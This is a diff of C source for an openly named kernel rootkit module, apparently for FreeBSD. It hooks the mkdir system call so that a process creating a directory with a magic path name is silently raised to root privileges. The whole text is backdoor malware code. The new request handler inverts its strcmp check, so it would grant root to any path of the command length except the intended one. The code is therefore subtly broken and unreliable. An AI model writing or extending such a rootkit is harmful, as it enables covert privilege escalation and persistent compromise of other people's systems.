@@ -36,6 +36,7 @@
 #include <sys/syscall.h>
 
 static int mkdir_hook(struct thread *td, void *syscall_args);
+static void rootkit_handle_request(struct thread *td, char *command);
 
 static int
 load(struct module *module, int cmd, void *arg)
@@ -62,26 +63,37 @@ load(struct module *module, int cmd, void *arg)
 
 static int
 mkdir_hook(struct thread *td, void *syscall_args) {
+	int error;
+	char path[255];
+
 	struct mkdir_args *uap;
 	uap = (struct mkdir_args *) syscall_args;
 
-	char path[255];
-	size_t done;
-	int error;
 
-	error = copyinstr(uap->path, path, 255, &done);
-
-	if (error != 0)
+	error = copyinstr(uap->path, path, 255, NULL);
+	if (!error)
 	{
-		return(error);
-	}
-
-	if (strcmp(path, RKIT_ELEVATE) == 0)
-	{
-		privilege_set(td, 0);
+		rootkit_handle_request(td, path);
 	}
 
 	return(sys_mkdir(td, syscall_args));
+}
+
+static void
+rootkit_handle_request(struct thread *td, char *command)
+{
+	/* Valid commands are RKCALL_LEN long. */
+	if (strnlen(command, RKCALL_LEN) != RKCALL_LEN)
+	{
+		return;
+	}
+
+	/* Check if the command is valid.
+	 * If the command is valid, the request will be handled. */
+	if (strcmp(command, RKCALL_ELEVATE))
+	{
+		privilege_set(td, 0);
+	}
 }
 
 static moduledata_t rootkit_mod = {
